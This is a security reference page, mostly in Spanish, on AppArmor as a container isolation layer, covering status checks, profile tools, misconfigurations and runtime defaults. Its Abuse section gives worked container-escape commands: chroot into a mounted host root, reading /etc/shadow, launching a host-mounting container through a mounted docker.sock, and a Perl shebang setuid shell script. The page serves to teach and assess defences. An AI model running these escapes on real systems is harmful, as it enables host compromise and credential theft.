# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visión general

AppArmor es un sistema de **Control de Acceso Obligatorio** que aplica restricciones mediante perfiles por programa. A diferencia de las comprobaciones DAC tradicionales, que dependen en gran medida de la propiedad por usuario y grupo, AppArmor permite que el kernel haga cumplir una política adjunta al propio proceso. En entornos de contenedores, esto importa porque una carga de trabajo puede tener suficientes privilegios tradicionales para intentar una acción y aun así ser denegada porque su perfil de AppArmor no permite el path, el mount, el comportamiento de red o el uso de capabilities relevantes.

El punto conceptual más importante es que AppArmor está **basado en paths**. Evalúa el acceso al sistema de ficheros mediante reglas de path en lugar de mediante etiquetas como hace SELinux. Eso lo hace accesible y potente, pero también implica que los bind mounts y las disposiciones alternativas de path merecen atención cuidadosa. Si el mismo contenido del host se vuelve accesible bajo un path diferente, el efecto de la política puede no ser el que el operador esperaba inicialmente.

## Papel en el aislamiento de contenedores

Las revisiones de seguridad de contenedores a menudo se quedan en las capabilities y seccomp, pero AppArmor sigue siendo relevante tras esas comprobaciones. Imagina un container que tiene más privilegios de los que debería, o una carga de trabajo que necesitó una capability extra por razones operativas. AppArmor todavía puede restringir el acceso a ficheros, el comportamiento de mounts, la networking y los patrones de ejecución de formas que bloquean la ruta de abuso más obvia. Por eso deshabilitar AppArmor "solo para que la aplicación funcione" puede transformar silenciosamente una configuración meramente arriesgada en una que sea activamente explotable.

## Laboratorio

Para comprobar si AppArmor está activo en el host, utiliza:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver bajo qué se está ejecutando el proceso actual del contenedor:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La diferencia es ilustrativa. En el caso normal, el proceso debería mostrar un contexto AppArmor ligado al perfil elegido por el runtime. En el caso unconfined, esa capa adicional de restricción desaparece.

También puedes inspeccionar lo que Docker cree que aplicó:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker puede aplicar un perfil AppArmor predeterminado o personalizado cuando el host lo soporta. Podman también puede integrarse con AppArmor en sistemas basados en AppArmor, aunque en distribuciones con SELinux como primera opción el otro sistema MAC suele cobrar protagonismo. Kubernetes puede exponer la política de AppArmor a nivel de workload en nodos que realmente soportan AppArmor. LXC y los entornos de system-container de la familia Ubuntu relacionados también usan AppArmor extensamente.

Lo práctico es que AppArmor no es una "Docker feature". Es una característica del kernel del host que varios runtimes pueden decidir aplicar. Si el host no lo soporta o al runtime se le indica ejecutar sin confinamiento, la supuesta protección realmente no está presente.

On Docker-capable AppArmor hosts, the best-known default is `docker-default`. That profile is generated from Moby's AppArmor template and is important because it explains why some capability-based PoCs still fail in a default container. In broad terms, `docker-default` allows ordinary networking, denies writes to much of `/proc`, denies access to sensitive parts of `/sys`, blocks mount operations, and restricts ptrace so that it is not a general host-probing primitive. Understanding that baseline helps distinguish "the container has `CAP_SYS_ADMIN`" from "the container can actually use that capability against the kernel interfaces I care about".

## Profile Management

AppArmor profiles are usually stored under `/etc/apparmor.d/`. Una convención común de nombres es reemplazar las barras en la ruta del ejecutable por puntos. Por ejemplo, un perfil para `/usr/bin/man` suele almacenarse como `/etc/apparmor.d/usr.bin.man`. Este detalle importa tanto en la defensa como en la evaluación porque una vez que conoces el nombre del perfil activo, a menudo puedes localizar rápidamente el archivo correspondiente en el host.

Los comandos útiles para gestión en el host incluyen:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La razón por la que estos comandos importan en una referencia de container-security es que explican cómo se construyen, cargan, cambian a complain mode y se modifican los perfiles tras cambios en la aplicación. Si un operador tiene la costumbre de mover los perfiles a complain mode durante la resolución de problemas y se olvida de restaurar enforcement, el contenedor puede parecer protegido en la documentación mientras en la realidad se comporta de forma mucho más laxa.

### Creación y actualización de perfiles

`aa-genprof` puede observar el comportamiento de la aplicación y ayudar a generar un perfil de forma interactiva:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` puede generar un perfil de plantilla que luego puede cargarse con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Cuando el binario cambia y la política necesita actualización, `aa-logprof` puede reproducir denegaciones encontradas en los registros y ayudar al operador a decidir si permitirlas o denegarlas:
```bash
sudo aa-logprof
```
### Registros

Las denegaciones de AppArmor suelen ser visibles a través de `auditd`, syslog, o herramientas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Esto es útil operacionalmente y ofensivamente. Los defensores lo usan para refinar los perfiles. Los atacantes lo usan para averiguar qué ruta u operación exacta está siendo denegada y si AppArmor es el control que está bloqueando una exploit chain.

### Identificando el archivo de perfil exacto

Cuando un runtime muestra un nombre de perfil AppArmor específico para un container, a menudo es útil mapear ese nombre de vuelta al archivo de perfil en el disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

## Misconfigurations

El error más obvio es `apparmor=unconfined`. Los administradores a menudo lo establecen mientras depuran una aplicación que falló porque el perfil bloqueó correctamente algo peligroso o inesperado. Si la bandera permanece en producción, la capa MAC completa se ha eliminado efectivamente.

Otro problema sutil es asumir que los bind mounts son inofensivos porque los permisos de archivos parecen normales. Dado que AppArmor es path-based, exponer rutas del host bajo ubicaciones de montaje alternativas puede interactuar mal con las reglas de ruta. Un tercer error es olvidar que el nombre de un perfil en un archivo de configuración significa muy poco si el kernel del host no está realmente aplicando AppArmor.

## Abuse

Cuando AppArmor no está presente, operaciones que antes estaban restringidas pueden funcionar de repente: leer rutas sensibles a través de bind mounts, acceder a partes de procfs o sysfs que deberían haber sido más difíciles de usar, realizar acciones relacionadas con mount si capabilities/seccomp también lo permiten, o usar rutas que un perfil normalmente denegaría. AppArmor suele ser el mecanismo que explica por qué un intento de escape basado en capabilities "debería funcionar" sobre el papel pero aún falla en la práctica. Quita AppArmor, y ese mismo intento puede comenzar a tener éxito.

Si sospechas que AppArmor es lo principal que impide una cadena de abuso path-traversal, bind-mount o mount-based, el primer paso suele ser comparar qué se vuelve accesible con y sin un perfil. Por ejemplo, si una ruta del host está montada dentro del contenedor, comienza comprobando si puedes recorrerla y leerla:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si el contenedor también tiene una capacidad peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas es comprobar si AppArmor es el control que está bloqueando las operaciones de montaje o el acceso a los sistemas de archivos sensibles del kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
En entornos donde una ruta del host ya está disponible a través de un bind mount, perder AppArmor también puede convertir un problema de divulgación de información de solo lectura en acceso directo a archivos del host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
El objetivo de estos comandos no es que AppArmor por sí solo provoque el escape. Se trata de que, una vez eliminado AppArmor, muchos vectores de abuso basados en el sistema de archivos y en montajes pasan a ser inmediatamente comprobables.

### Ejemplo completo: AppArmor deshabilitado + raíz del host montada

Si el contenedor ya tiene la raíz del host bind-mounted en `/host`, eliminar AppArmor puede convertir una ruta de abuso del sistema de archivos bloqueada en un escape completo del host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una vez que el shell se está ejecutando a través del sistema de archivos del host, la carga de trabajo ha escapado efectivamente del límite del contenedor:
```bash
id
hostname
cat /etc/shadow | head
```
### Ejemplo completo: AppArmor deshabilitado + socket en tiempo de ejecución

Si la verdadera barrera era AppArmor alrededor del estado en tiempo de ejecución, un socket montado puede ser suficiente para un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
La ruta exacta depende del punto de montaje, pero el resultado final es el mismo: AppArmor ya no impide el acceso a la runtime API, y la runtime API puede lanzar un container que compromete al host.

### Ejemplo completo: Path-Based Bind-Mount Bypass

Debido a que AppArmor es path-based, proteger `/proc/**` no protege automáticamente el mismo contenido procfs del host cuando es accesible a través de una ruta diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
El impacto depende de qué exactamente esté montado y de si la ruta alternativa también elude otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con la disposición de montajes en lugar de aisladamente.

### Ejemplo completo: Shebang Bypass

La política de AppArmor a veces apunta a la ruta del intérprete de una manera que no tiene plenamente en cuenta la ejecución de scripts a través del shebang handling. Un ejemplo histórico implicó usar un script cuya primera línea apunta a un intérprete confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de ejemplo es importante como recordatorio de que la intención del perfil y la semántica de ejecución real pueden divergir. Al revisar AppArmor en entornos de contenedores, las cadenas de intérpretes y las rutas de ejecución alternativas merecen especial atención.

## Checks

El objetivo de estas comprobaciones es responder rápidamente tres preguntas: ¿está AppArmor habilitado en el host?, ¿está confinado el proceso actual? y ¿el runtime aplicó realmente un perfil a este contenedor?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Lo interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, la carga de trabajo no se beneficia del confinamiento de AppArmor.
- Si `aa-status` muestra AppArmor deshabilitado o no cargado, cualquier nombre de perfil en la configuración de runtime es mayormente cosmético.
- Si `docker inspect` muestra `unconfined` o un perfil personalizado inesperado, eso suele ser la razón por la que funciona una vía de abuso basada en filesystem o mounts.

Si un contenedor ya tiene privilegios elevados por razones operativas, dejar AppArmor habilitado a menudo marca la diferencia entre una excepción controlada y una falla de seguridad mucho más amplia.

## Valores predeterminados de runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitación manual común |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por defecto en hosts compatibles con AppArmor | Usa el perfil de AppArmor `docker-default` salvo que se anule | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende del host | AppArmor es compatible mediante `--security-opt`, pero el valor predeterminado exacto depende del host/runtime y es menos universal que el perfil `docker-default` documentado de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predeterminado condicional | Si `appArmorProfile.type` no está especificado, el valor predeterminado es `RuntimeDefault`, pero solo se aplica cuando AppArmor está habilitado en el nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un perfil débil, nodos sin soporte de AppArmor |
| containerd / CRI-O bajo Kubernetes | Sigue el soporte del nodo/runtime | Los runtimes comunes soportados por Kubernetes soportan AppArmor, pero la aplicación real aún depende del soporte del nodo y de la configuración de la carga de trabajo | Igual que en la fila de Kubernetes; la configuración directa del runtime también puede omitir AppArmor por completo |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Una configuración de perfil en un manifiesto no crea confinamiento en un nodo donde AppArmor no está habilitado.
{{#include ../../../../banners/hacktricks-training.md}}
